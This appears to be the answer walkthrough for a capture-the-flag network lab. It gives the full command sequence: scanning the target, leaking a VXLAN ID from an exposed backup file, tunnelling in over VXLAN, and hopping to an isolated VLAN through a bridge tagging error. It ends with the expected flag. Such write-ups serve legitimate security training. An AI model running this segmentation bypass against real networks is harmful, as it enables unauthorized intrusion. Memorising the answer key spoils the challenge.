# Red Team Manual Solution

The attacker receives only the target IP.

```bash
export TARGET_IP="<challenge-ip>"
sudo nmap -Pn -n -p- --min-rate 1500 "$TARGET_IP"
sudo nmap -Pn -n -sU -p 4789 "$TARGET_IP"
curl -fsS "http://${TARGET_IP}:8088/backup.conf"
```

The backup reveals `VXLAN_VNI=200`.

```bash
export OUT_IF="$(ip route get "$TARGET_IP" | awk '{for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}')"
sudo ip link delete vxlan200 2>/dev/null || true
sudo ip link add vxlan200 type vxlan id 200 remote "$TARGET_IP" dstport 4789 dev "$OUT_IF"
sudo ip link set vxlan200 up
sudo dhclient -1 -v vxlan200
ip -4 addr show vxlan200
```

Enumerate VLAN 10:

```bash
sudo nmap -e vxlan200 -n -sT -p 8080 10.20.10.0/24
curl --interface vxlan200 -fsS http://10.20.10.20:8080/network-note
```

The note reveals VLAN 30 and `10.20.30.0/24`. Exploit the bridge tagging error:

```bash
sudo ip link add link vxlan200 name vxlan200.30 type vlan id 30
sudo ip link set vxlan200.30 up
sudo ip addr add 10.20.30.50/24 dev vxlan200.30
curl --interface vxlan200.30 -fsS http://10.20.30.10:8080/
```

Expected flag:

```text
FLAG{linux_bridge_tagged_vlan_bypass}
```
